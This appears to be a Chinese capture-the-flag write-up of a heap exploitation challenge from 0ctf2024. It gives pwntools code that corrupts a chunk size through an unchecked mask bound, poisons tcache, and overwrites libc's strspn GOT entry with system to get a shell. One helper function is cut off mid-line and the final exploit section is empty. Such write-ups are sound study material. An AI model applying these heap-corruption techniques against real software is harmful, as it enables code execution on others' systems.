@@ -1,0 +1,205 @@
+
+# [CTF] 0ctf2024 IP Management System 复现
+
+- 原帖：https://www.52pojie.cn/forum.php?mod=viewthread&tid=2031736
+- 抓取时间：2026-11-01T22:09:36
+
+## 0x0 前言
+
+之前发的帖子除了比较简单的题外基本都在复现过往棘手的题。用户态的 pwn 题难点包括逆向难、漏洞隐蔽、攻击手法冷门等，其中花样非常多的题如 llvm、musl 等其实也在逐渐消失了，因为这类题目就是初见杀，本身题目难度并不算高。逆向难的题中有些题可能出题人并不希望选手将其完全逆出来，所以会删除符号表、内联优化等手段使代码难以阅读（一般不会用 reverse 方向的混淆或防调试手段），预期解一般是通过模糊测试等将 bug 所在位置找出再进行利用。漏洞隐蔽的题需要选手有充足的经验来识别漏洞，如终止条件设置错误、变量未初始化、在字符串最后补 0 导致溢出等。攻击手法冷门的题除了出题人故意为了考某个考点而设置的题外，还有通过上网搜索得到的 cve 等，这类的题除了平时多积累，还需要会使用搜索引擎来找出漏洞从而利用。
+
+本题逆向难度不高，但漏洞较难利用，我也是根据队友的代码分析出漏洞利用方式从而完成 getshell。
+
+## 0x1 逆向分析
+
+这道题堆利用非常麻烦，没开沙箱算是出题人最大的仁慈了。逆向分析详见附件。题目实现了一个 ip 管理系统，可以创建 ip 集合、删除集合、在集合中添加、删除和查询 ip（均是通过位运算来实现的）。其中，添加或删除 ip 有三种方式，`ip1-ip2`（指定 ip 范围）、`ip/num`（指定 ip 数量）、`ip`（单个 ip）。由于是按位存储 ip，所以指定了集合的 ip 范围后就会创建大小为 `((end_ip - start_ip) >> 3) + 1` 的堆。
+
+由此可得出交互代码：
+
+```python
+from pwncli import *
+
+elf = ELF("./pwn")
+io = gift.io = elf.process()
+# io = gift.io = remote("node.vnteam.cn", 44029)
+libc = elf.libc
+context(log_level="info", arch=elf.arch, terminal=["tmux", "sp", "-h"])
+# --------
+
+def num_to_ip(num):
+    res = []
+    for i in range(4):
+        res.append(str(num & 0xff))
+        num >>= 8
+    return ".".join(reversed(res))
+    
+
+menu = lambda choice: sla(b"Choose an option: ", str(choice).encode())
+def create_ip_set(start_ip, end_ip):
+    menu(1)
+    sla(b"Please input start ip:", start_ip.encode())
+    sla(b"Please input end ip:", end_ip.encode())
+
+def mod_ip_set_range(is_add, start_ip, end_ip):
+    menu(2 if is_add else 3)
+    sla(b"Please input ip: ", f"{start_ip}-{end_ip}".encode())
+
+def mod_ip_set_num(is_add, start_ip, num):
+    menu(2 if is_add else 3)
+    sla(b"Please input ip: ", f"{start_ip}/{32 - num}".encode())
+
+def mod_ip_set_ip(is_add, ip):
+    menu(2 if is_add else 3)
+    sla(b"Please input ip: ", ip.encode())
+
+def query_ip(ip):
+    menu(4)
+    sla(b"Please input ip:", ip.encode())
+    return 0 if (b"not" in rl()) else 1
+
+def delete_ip_set():
+    menu(5)
+
+def alloc(size, start_num=0):
+    create_ip_set(num_to_ip(start_num), num_to_ip(start_num + (size >= 1
+```
+
+## 0x2 漏洞利用
+
+`ip/num` 的地方有漏洞。这里我看了很久也不知道什么意思，自己算了下才知道 `num` 并不是 ip 数量而是掩码位数，比如 `num` 为 24 的时候会插入或删除 `xx.xx.xx.0-xx.xx.xx.255`。由于在代码的最后只检查了右边界没有检查左边界，导致可以向上溢出。通过这个漏洞修改 `size` 需要精确地设计掩码位数以及掩码范围的数，一次插入一次删除，就能将 `size` 改大，然后重新取出时就能造成堆重叠。示例代码如下：
+
+```python
+attach(io)
+
+alloc(0x10)
+
+delete_ip_set()
+
+pause()
+
+alloc(0x28, 0x00ffff3c) # 0x13c
+
+mod_ip_set_num(True, num_to_ip(0x00fffffe), 9)
+
+pause()
+
+alloc(0x38, 0x00fffebb) # 0x2bc
+
+mod_ip_set_num(False, num_to_ip(0x00fffffe), 10) # 改size
+```
+
+三个断点的堆布局如下：
+
+![mod0.jpg](https://attach.52pojie.cn/forum/202505/15/225108duhj6rv18rru3n6v.jpg)
+
+*mod0.jpg（91.57 KB，下载次数：1；2025-5-15 22:51 上传）*
+
+![mod1.jpg](https://attach.52pojie.cn/forum/202505/15/225111s2ymd99dnvtvpad9.jpg)
+
+*mod1.jpg（90.08 KB，下载次数：2；2025-5-15 22:51 上传）*
+
+![mod2.jpg](https://attach.52pojie.cn/forum/202505/15/225113n34kqbshqo2htuzl.jpg)
+
+*mod2.jpg（91.46 KB，下载次数：1；2025-5-15 22:51 上传）*
+
+通过精确地设计掩码位数以及掩码范围的数，成功将 `size` 修改成 0x1021。
+
+## 0x3 堆布局详解
+
+堆利用难的地方在于，同一时刻只能拥有一个堆块，并且堆块的释放没有 uaf。高版本堆利用有很多 house 攻击方式，用于针对 `got` 表不可写的题目。但是堆利用最简单最有效的方式仍然是 tcache，因为 tcache 检查非常少，连 `size` 都不做检查，只要破坏 `key` 就能 double free 等特点也使其成为最方便的利用方式。下面详细布局堆：
+
+### 第一步，泄漏堆地址
+
+```python
+alloc(0x10) # 泄漏堆地址
+delete_ip_set()
+alloc(0x10)
+heap_addr = read_addr()
+```
+
+```python
+sizelist = [0x200, 0x210, 0x220, 0x3b0,
+
+            0x10, 0x20, 0x30, 0x40, 0x300, 0x310, 0x320, 0x330, 0x270, # 构成0x1020重叠块(加上后面0x20字节)
+
+            ]
+
+for size in sizelist:
+
+    alloc(size)
+
+    delete_ip_set()
+
+alloc(0x420) # 提前留下chunk头，让后面能释放unsorted bin
+
+write_qword(0x21, (0x18))
+
+write_qword(0x21, (0x38))
+
+write_qword(0x21, (0x58))
+
+delete_ip_set()
+
+alloc(0x28, 0x13c) # 0x13c
+
+mod_ip_set_num(True, num_to_ip(0x1ff), 9)
+
+alloc(0x38, 0x2bb) # 0x2bb
+
+mod_ip_set_num(False, num_to_ip(0x3ff), 10) # 改size
+
+alloc(0x10) # 分配0x1020块
+
+delete_ip_set()
+
+alloc(0x10)
+
+libc.address = read_addr() - 0x21b300
+
+success(f"{libc.address = :x}")
+```
+
+![heap1.jpg](https://attach.52pojie.cn/forum/202505/15/232324kjoi0bmnw7hsttfn.jpg)
+
+*heap1.jpg（19.48 KB，下载次数：1；2025-5-15 23:23 上传）*
+
+### 第三步，改 top chunk size
+
+```python
+alloc(0x90)
+write_qword(0xfb1, 0x68) # 改0x50块的size，用于修改top chunk size
+alloc(0x40)
+delete_ip_set() # 这一行将造成堆重叠
+alloc(0xfa0)
+write_qword(0x331, 0xf68) # 修改top chunk size
+```
+
+![heap2.jpg](https://attach.52pojie.cn/forum/202505/15/232326uccrvgmbvyc8b0k5.jpg)
+
+*heap2.jpg（24.34 KB，下载次数：1；2025-5-15 23:23 上传）*
+
+### 第四步，将 top chunk 剩余部分放入 tcache，修改 `tcache next` 指向 lib 的 `got` 表
+
+这里修改 `strspn` 为 `system`，这样调用 `strtok` 的时候就会 getshell。
+
+```python
+alloc(0x1000) # 把块0x330放进tcache
+
+alloc(0xf50) # 获取0x1020块剩余部分，用于修改tcache next
+
+write_qword(((heap_addr >> 12) + 1) ^ (libc.got.strspn - 8), 0xf40)
+
+alloc(0x300)
+
+alloc(0x300) # 分配到strspn
+
+write_qword(libc.sym.system, 8)
+
+mod_ip_set_num(True, "/bin/sh;", 0)
+```
+
+![heap3.jpg](https://attach.52pojie.cn/forum/202505/15/232328o1z1x0tx8b1s0gb6.jpg)
+
+*heap3.jpg（26.08 KB，下载次数：1；2025-5-15 23:23 上传）*
+
+## 0x4 exp
